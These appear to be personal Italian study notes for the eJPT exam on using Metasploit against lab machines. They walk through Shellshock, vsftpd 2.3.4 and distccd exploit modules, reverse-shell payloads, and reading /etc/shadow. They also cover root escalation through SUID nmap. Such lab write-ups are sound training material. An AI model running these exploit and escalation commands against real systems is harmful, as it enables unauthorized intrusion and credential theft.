# Metasploit Notes

Appunti personali sull’utilizzo di Metasploit per exploitation in ambienti di laboratorio e preparazione eJPT.

> Tutti i comandi sono da usare solo in ambienti autorizzati e controllati.

---

## 1. Obiettivo

Metasploit serve per:

```text
cercare moduli
verificare vulnerabilità note
configurare exploit
ottenere sessioni
gestire shell e Meterpreter
fare post-exploitation in laboratorio
```

Regola importante:

```text
Enumeration first, exploitation later.
```

Prima di usare Metasploit bisogna sempre fare:

```text
1. Network discovery
2. Port scanning
3. Service enumeration
4. Analisi versioni
5. Scelta del modulo corretto
```

---

## 2. Avvio

Avviare Metasploit:

```bash
msfconsole
```

Prompt Metasploit:

```text
msf6 >
```

---

## 3. Ricerca moduli

Cercare moduli in base al servizio o alla vulnerabilità:

```text
search nome_servizio
search vsftpd
search samba
search tomcat
search unrealircd
search distccd
search cgi
```

Esempi:

```text
search vsftpd
search samba 3.0.20
search tomcat manager
search unrealircd
```

---

## 4. Selezione modulo

Selezionare un modulo:

```text
use exploit/path/del/modulo
```

Esempio Shellshock CGI:

```text
use exploit/multi/http/apache_mod_cgi_bash_env_exec
```

Esempio vsftpd:

```text
use exploit/unix/ftp/vsftpd_234_backdoor
```

---

## 5. Informazioni sul modulo

Visualizzare informazioni sul modulo:

```text
info
```

Visualizzare opzioni richieste:

```text
show options
```

Visualizzare payload disponibili:

```text
show payloads
```

Regola:

```text
Prima di lanciare un exploit, controllare sempre show options.
```

---

## 6. Parametri principali

```text
RHOSTS    = IP o hostname del target
RPORT     = porta del servizio target
LHOST     = IP della macchina attaccante
LPORT     = porta locale in ascolto
TARGETURI = percorso web da colpire
PAYLOAD   = payload usato dal modulo
```

Esempio:

```text
set RHOSTS 192.168.1.100
set RPORT 21
set LHOST 192.168.1.101
set LPORT 4444
```

Regola importante:

```text
RHOSTS = target
LHOST  = IP della tua Kali
```

Non usare:

```text
127.0.0.1
```

come `LHOST` per una reverse shell.

---

## 7. Workflow base Metasploit

Flusso standard:

```text
search
use
show options
set RHOSTS
set LHOST
run
```

Esempio generico:

```text
search nome_servizio
use exploit/path/module
show options
set RHOSTS TARGET
set LHOST KALI_IP
run
```

Dopo exploit riuscito:

```text
sessions
sessions -i 1
background
```

---

## 8. Esempio CGI / Shellshock

Modulo:

```text
exploit/multi/http/apache_mod_cgi_bash_env_exec
```

Comandi:

```text
use exploit/multi/http/apache_mod_cgi_bash_env_exec
show options
set RHOSTS target1.ine.local
set TARGETURI /browser.cgi
set LHOST <IP_KALI>
run
```

Interpretazione:

```text
RHOSTS indica il target.
TARGETURI indica il percorso CGI vulnerabile.
LHOST indica l'IP della Kali che riceverà la connessione.
```

---

## 9. Esempio Metasploitable2 - vsftpd 2.3.4

Durante la service enumeration è stato identificato:

```text
21/tcp open ftp vsftpd 2.3.4
```

Ricerca modulo:

```text
search vsftpd
```

Modulo usato:

```text
exploit/unix/ftp/vsftpd_234_backdoor
```

Selezione modulo:

```text
use exploit/unix/ftp/vsftpd_234_backdoor
```

Controllo opzioni:

```text
show options
```

Impostazione target:

```text
set RHOSTS 192.168.1.100
```

Se il payload richiede `LHOST`, impostare l’IP della Kali sulla rete laboratorio:

```text
set LHOST 192.168.1.101
```

Esecuzione:

```text
run
```

Output positivo:

```text
[+] 192.168.1.100:21 - Backdoor has been spawned!
[*] Meterpreter session 1 opened
```

Interpretazione:

```text
Exploit riuscito.
Sessione Meterpreter aperta sul target.
```

---

## 10. Errori comuni in Metasploit

### Errore 1: parametro scritto male

Errore:

```text
set RHOTS 192.168.1.100
```

Corretto:

```text
set RHOSTS 192.168.1.100
```

Nota:

```text
RHOSTS = Remote Hosts
```

---

### Errore 2: comando scritto maiuscolo

Errore:

```text
RUN
```

Corretto:

```text
run
```

Oppure:

```text
exploit
```

---

### Errore 3: LHOST mancante

Errore:

```text
One or more options failed to validate: LHOST
```

Causa:

```text
Il payload è reverse e deve sapere l'IP della macchina attaccante.
```

Correzione:

```text
set LHOST 192.168.1.101
```

---

## 11. Differenza tra prompt Metasploit e Meterpreter

Prompt Metasploit:

```text
msf6 >
msf6 exploit(...) >
```

Qui si usano:

```text
search
use
show options
set RHOSTS
set LHOST
run
show payloads
```

Prompt Meterpreter:

```text
meterpreter >
```

Qui si usano:

```text
getuid
sysinfo
pwd
ls
shell
background
```

Errore tipico:

```text
meterpreter > show payloads
Unknown command: show
```

Perché `show payloads` funziona nel prompt Metasploit, non dentro Meterpreter.

---

## 12. Comandi Meterpreter base

Verificare utente:

```text
getuid
```

Informazioni sistema:

```text
sysinfo
```

Directory corrente:

```text
pwd
```

Lista file:

```text
ls
```

Aprire shell Linux/Windows:

```text
shell
```

Mettere sessione in background:

```text
background
```

---

## 13. Dopo avere ottenuto una shell

Dentro una shell Linux:

```bash
whoami
id
hostname
uname -a
ip a
pwd
```

Se l’utente è root:

```text
whoami: root
uid=0(root)
```

significa che hai privilegi amministrativi completi sul target.

---

## 14. Gestione sessioni

Mostrare sessioni attive:

```text
sessions
```

Entrare in una sessione:

```text
sessions -i 1
```

Mettere sessione in background:

```text
background
```

Chiudere una sessione:

```text
exit
```

---

## 15. Regola pratica eJPT

Quando trovi una versione vulnerabile:

```text
1. Cerca il modulo
2. Leggi info
3. Controlla show options
4. Imposta RHOSTS
5. Imposta LHOST se richiesto
6. Esegui run
7. Verifica sessione
8. Esegui whoami/id
9. Documenta risultato
```

---

## 16. Catena esempio - vsftpd 2.3.4

```text
Nmap trova vsftpd 2.3.4
↓
search vsftpd
↓
use exploit/unix/ftp/vsftpd_234_backdoor
↓
show options
↓
set RHOSTS 192.168.1.100
↓
set LHOST 192.168.1.101
↓
run
↓
Meterpreter session opened
↓
getuid
↓
Server username: root
↓
shell
↓
whoami
↓
root
```

---

## 17. Note etiche

Metasploit deve essere usato solo:

```text
in laboratorio personale
in ambienti autorizzati
in CTF
in esami pratici dove è consentito
in attività professionali con autorizzazione scritta
```
# Metasploit Notes

Appunti personali sull’utilizzo di Metasploit per exploitation in ambienti di laboratorio e preparazione eJPT.

> Tutti i comandi sono da usare solo in ambienti autorizzati e controllati.

---

## 1. Obiettivo

Metasploit serve per:

```text
cercare moduli
verificare vulnerabilità note
configurare exploit
ottenere sessioni
gestire shell e Meterpreter
fare post-exploitation in laboratorio
```

Regola importante:

```text
Enumeration first, exploitation later.
```

Prima di usare Metasploit bisogna sempre fare:

```text
1. Network discovery
2. Port scanning
3. Service enumeration
4. Analisi versioni
5. Scelta del modulo corretto
```

---

## 2. Avvio

Avviare Metasploit:

```bash
msfconsole
```

Prompt Metasploit:

```text
msf6 >
```

oppure:

```text
msf >
```

---

## 3. Ricerca moduli

Cercare moduli in base al servizio o alla vulnerabilità:

```text
search nome_servizio
search vsftpd
search samba
search tomcat
search unrealircd
search distccd
search cgi
```

Esempi:

```text
search vsftpd
search samba 3.0.20
search tomcat manager
search unrealircd
search distccd
```

---

## 4. Selezione modulo

Selezionare un modulo:

```text
use exploit/path/del/modulo
```

Esempio Shellshock CGI:

```text
use exploit/multi/http/apache_mod_cgi_bash_env_exec
```

Esempio vsftpd:

```text
use exploit/unix/ftp/vsftpd_234_backdoor
```

Esempio distccd:

```text
use exploit/unix/misc/distcc_exec
```

---

## 5. Informazioni sul modulo

Visualizzare informazioni sul modulo:

```text
info
```

Visualizzare opzioni richieste:

```text
show options
```

Visualizzare payload disponibili:

```text
show payloads
```

Regola:

```text
Prima di lanciare un exploit, controllare sempre show options.
```

---

## 6. Parametri principali

```text
RHOSTS    = IP o hostname del target
RPORT     = porta del servizio target
LHOST     = IP della macchina attaccante
LPORT     = porta locale in ascolto
TARGETURI = percorso web da colpire
PAYLOAD   = payload usato dal modulo
```

Esempio:

```text
set RHOSTS 192.168.1.100
set RPORT 21
set LHOST 192.168.1.101
set LPORT 4444
```

Regola importante:

```text
RHOSTS = target
LHOST  = IP della tua Kali
```

Non usare:

```text
127.0.0.1
```

come `LHOST` per una reverse shell.

---

## 7. Workflow base Metasploit

Flusso standard:

```text
search
use
show options
set RHOSTS
set LHOST
run
```

Esempio generico:

```text
search nome_servizio
use exploit/path/module
show options
set RHOSTS TARGET
set LHOST KALI_IP
run
```

Dopo exploit riuscito:

```text
sessions
sessions -i 1
background
```

---

## 8. Esempio CGI / Shellshock

Modulo:

```text
exploit/multi/http/apache_mod_cgi_bash_env_exec
```

Comandi:

```text
use exploit/multi/http/apache_mod_cgi_bash_env_exec
show options
set RHOSTS target1.ine.local
set TARGETURI /browser.cgi
set LHOST <IP_KALI>
run
```

Interpretazione:

```text
RHOSTS indica il target.
TARGETURI indica il percorso CGI vulnerabile.
LHOST indica l'IP della Kali che riceverà la connessione.
```

---

## 9. Esempio Metasploitable2 - vsftpd 2.3.4

Durante la service enumeration è stato identificato:

```text
21/tcp open ftp vsftpd 2.3.4
```

Ricerca modulo:

```text
search vsftpd
```

Modulo usato:

```text
exploit/unix/ftp/vsftpd_234_backdoor
```

Selezione modulo:

```text
use exploit/unix/ftp/vsftpd_234_backdoor
```

Controllo opzioni:

```text
show options
```

Impostazione target:

```text
set RHOSTS 192.168.1.100
```

Se il payload richiede `LHOST`, impostare l’IP della Kali sulla rete laboratorio:

```text
set LHOST 192.168.1.101
```

Esecuzione:

```text
run
```

Output positivo:

```text
[+] 192.168.1.100:21 - Backdoor has been spawned!
[*] Meterpreter session 1 opened
```

Interpretazione:

```text
Exploit riuscito.
Sessione Meterpreter aperta sul target.
```

---

## 10. Comandi Meterpreter base

Quando il prompt diventa:

```text
meterpreter >
```

si usano comandi Meterpreter.

Verificare utente:

```text
getuid
```

Informazioni sistema:

```text
sysinfo
```

Directory corrente:

```text
pwd
```

Lista file:

```text
ls
```

Aprire shell Linux/Windows:

```text
shell
```

Mettere sessione in background:

```text
background
```

Esempio:

```text
meterpreter > getuid
Server username: root

meterpreter > sysinfo
Computer     : metasploitable.localdomain
OS           : Ubuntu 8.04
Architecture : i686
Meterpreter  : x86/linux
```

---

## 11. Differenza tra prompt Metasploit e Meterpreter

Prompt Metasploit:

```text
msf6 >
msf6 exploit(...) >
```

Qui si usano:

```text
search
use
show options
set RHOSTS
set LHOST
run
show payloads
```

Prompt Meterpreter:

```text
meterpreter >
```

Qui si usano:

```text
getuid
sysinfo
pwd
ls
shell
background
```

Errore tipico:

```text
meterpreter > show payloads
Unknown command: show
```

Perché `show payloads` funziona nel prompt Metasploit, non dentro Meterpreter.

---

## 12. Dopo avere ottenuto una shell

Dentro una shell Linux:

```bash
whoami
id
hostname
uname -a
ip a
pwd
```

Se l’utente è root:

```text
whoami: root
uid=0(root)
```

significa che hai privilegi amministrativi completi sul target.

---

## 13. Gestione sessioni

Mostrare sessioni attive:

```text
sessions
```

Entrare in una sessione:

```text
sessions -i 1
```

Mettere sessione in background:

```text
background
```

Chiudere una sessione:

```text
exit
```

Nota:

```text
sessions e sessions -i 1 si usano dal prompt Metasploit.
Se sei già dentro una shell, devi usare comandi Linux.
```

---

## 14. Errori comuni in Metasploit

### Errore 1: parametro scritto male

Errore:

```text
set RHOTS 192.168.1.100
```

Corretto:

```text
set RHOSTS 192.168.1.100
```

Nota:

```text
RHOSTS = Remote Hosts
```

---

### Errore 2: comando scritto maiuscolo

Errore:

```text
RUN
```

Corretto:

```text
run
```

Oppure:

```text
exploit
```

---

### Errore 3: LHOST mancante

Errore:

```text
One or more options failed to validate: LHOST
```

Causa:

```text
Il payload è reverse e deve sapere l'IP della macchina attaccante.
```

Correzione:

```text
set LHOST 192.168.1.101
```

---

### Errore 4: comando sessione scritto male

Errore:

```text
session -i 1
```

Corretto:

```text
sessions -i 1
```

---

### Errore 5: payload scritto male

Errore:

```text
show paylods
```

Corretto:

```text
show payloads
```

---

## 15. Esempio Metasploitable2 - distccd

Durante la service enumeration è stato identificato:

```text
3632/tcp open distccd distccd v1
```

Ricerca modulo:

```text
search distccd
```

Modulo trovato:

```text
exploit/unix/misc/distcc_exec
```

Selezione modulo:

```text
use exploit/unix/misc/distcc_exec
```

Controllo opzioni:

```text
show options
```

Impostazione target:

```text
set RHOSTS 192.168.1.100
```

Impostazione LHOST:

```text
set LHOST 192.168.1.101
```

---

## 16. Distccd - Payload Troubleshooting

Con `distcc_exec`, Metasploit può selezionare inizialmente:

```text
cmd/unix/reverse_bash
```

Configurazione:

```text
set RHOSTS 192.168.1.100
set LHOST 192.168.1.101
set LPORT 4445
run
```

Errore possibile:

```text
bash: /dev/tcp/192.168.1.101/4445: No such file or directory
Exploit completed, but no session was created.
```

Interpretazione:

```text
L’exploit parte, ma il payload reverse_bash non crea una sessione.
Il problema è legato a /dev/tcp sul target.
```

Soluzione:

```text
show payloads
set payload payload/cmd/unix/reverse_perl
set RHOSTS 192.168.1.100
set LHOST 192.168.1.101
set LPORT 4446
run
```

Output positivo:

```text
Command shell session 1 opened
192.168.1.101:4446 -> 192.168.1.100:57883
```

Interpretazione:

```text
Exploit riuscito.
Reverse shell ottenuta sul target.
```

---

## 17. Distccd - Verifica shell

Dopo avere ottenuto la command shell:

```bash
whoami
id
hostname
uname -a
pwd
```

Risultato esempio:

```text
whoami: daemon
id: uid=1(daemon) gid=1(daemon) groups=1(daemon)
hostname: metasploitable
uname -a: Linux metasploitable 2.6.24-16-server i686 GNU/Linux
pwd: /tmp
```

Interpretazione:

```text
L’exploit distccd ha fornito accesso come utente daemon.
La shell non è root.
Serve post-exploitation e privilege escalation.
```

---

## 18. Distccd - Post-Exploitation Enumeration

Comandi utili dopo accesso come utente basso:

```bash
whoami
id
hostname
uname -a
pwd
cat /etc/passwd
ls -la /home
ls -la /home/msfadmin
ls -la /home/user
ls -la /home/service
ls -la /var/www
```

Cercare file protetti:

```bash
cat /root/.rhosts 2>&1
cat /root/reset_logs.sh 2>&1
```

Se il risultato è:

```text
Permission denied
```

significa che l’utente corrente non ha ancora privilegi sufficienti.

---

## 19. Distccd - Ricerca SUID

Ricerca file con bit SUID attivo:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Risultato interessante su Metasploitable2:

```text
/usr/bin/nmap
```

Interpretazione:

```text
Il binario /usr/bin/nmap ha il bit SUID attivo.
Una vecchia versione di Nmap con modalità interattiva può essere usata per ottenere privilegi effettivi root.
```

---

## 20. Privilege Escalation con SUID Nmap

Avviare Nmap in modalità interattiva:

```bash
/usr/bin/nmap --interactive
```

Prompt ottenuto:

```text
nmap>
```

Lanciare una shell:

```bash
!sh
```

Verificare privilegi:

```bash
whoami
id
hostname
pwd
```

Risultato:

```text
whoami: root
id: uid=1(daemon) gid=1(daemon) euid=0(root) groups=1(daemon)
hostname: metasploitable
pwd: /tmp
```

Interpretazione:

```text
uid=1(daemon) indica l’utente reale.
euid=0(root) indica che il processo sta eseguendo con privilegi effettivi di root.
La privilege escalation è riuscita.
```

---

## 21. Conferma privilegi root

Leggere `/etc/shadow`:

```bash
cat /etc/shadow | head
```

Esempio:

```text
root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::
daemon:*:14684:0:99999:7:::
bin:*:14684:0:99999:7:::
```

Interpretazione:

```text
/etc/shadow contiene hash delle password.
Se riesco a leggerlo, ho privilegi root o equivalenti.
```

Leggere file protetto in `/root`:

```bash
cat /root/reset_logs.sh
```

Se prima dava:

```text
Permission denied
```

e dopo la privilege escalation viene letto correttamente, la scalata è confermata.

---

## 22. Catena completa distccd

```text
Nmap trova distccd su 3632
↓
Metasploit: exploit/unix/misc/distcc_exec
↓
Payload reverse_bash fallisce
↓
Cambio payload: reverse_perl
↓
Shell come daemon
↓
Post-exploitation enumeration
↓
find / -perm -4000 -type f 2>/dev/null
↓
Trovato /usr/bin/nmap SUID
↓
/usr/bin/nmap --interactive
↓
!sh
↓
euid=0(root)
↓
lettura /etc/shadow
↓
lettura /root/reset_logs.sh
```

---

## 23. Regola pratica eJPT

Quando trovi una versione vulnerabile:

```text
1. Cerca il modulo
2. Leggi info
3. Controlla show options
4. Imposta RHOSTS
5. Imposta LHOST se richiesto
6. Esegui run
7. Verifica sessione
8. Esegui whoami/id
9. Se non sei root, fai post-exploitation
10. Cerca credenziali, file utili e SUID
11. Documenta risultato
```

---

## 24. Lezioni apprese

```text
Exploit riuscito non significa sempre root.
Se la shell è utente basso, serve privilege escalation.
Se un exploit non crea sessione, controllare payload, LHOST e LPORT.
reverse_bash può fallire se /dev/tcp non funziona.
reverse_perl può essere più compatibile su vecchi target Linux.
La ricerca SUID è fondamentale per privilege escalation Linux.
euid=0(root) indica privilegi effettivi root.
```

---

## 25. Note etiche

Metasploit deve essere usato solo:

```text
in laboratorio personale
in ambienti autorizzati
in CTF
in esami pratici dove è consentito
in attività professionali con autorizzazione scritta
```

Non usare Metasploit contro sistemi reali senza permesso esplicito.

Non usare Metasploit contro sistemi reali senza permesso esplicito.

